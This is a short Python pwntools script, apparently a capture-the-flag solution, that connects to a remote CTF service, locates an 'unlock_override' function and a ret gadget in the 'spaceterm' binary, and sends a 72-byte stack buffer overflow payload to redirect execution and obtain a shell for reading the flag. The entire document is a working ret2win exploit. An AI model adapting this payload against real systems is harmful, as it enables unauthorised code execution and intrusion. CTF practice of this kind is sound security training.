#!/usr/bin/env python3
from pwn import *

# Remote connection
p = remote('ctf.neocyberrange.com', 9003)
elf = ELF('./spaceterm')

unlock_override = elf.symbols['unlock_override']
ret_gadget = ROP(elf).find_gadget(['ret'])[0]

log.info(f"unlock_override: {hex(unlock_override)}")
log.info(f"ret_gadget: {hex(ret_gadget)}")

p.recvuntil(b'ACCESS CODE > ')

# Build payload - CONFIRMED WORKING offset of 72
offset = 72
payload = b'A' * offset + p64(ret_gadget) + p64(unlock_override)

log.info("Sending payload...")
p.sendline(payload)

# The shell spawns! Now interact with it
log.success("Payload sent! You should have a shell now.")
log.info("Type commands like: cat flag.txt")

p.interactive()
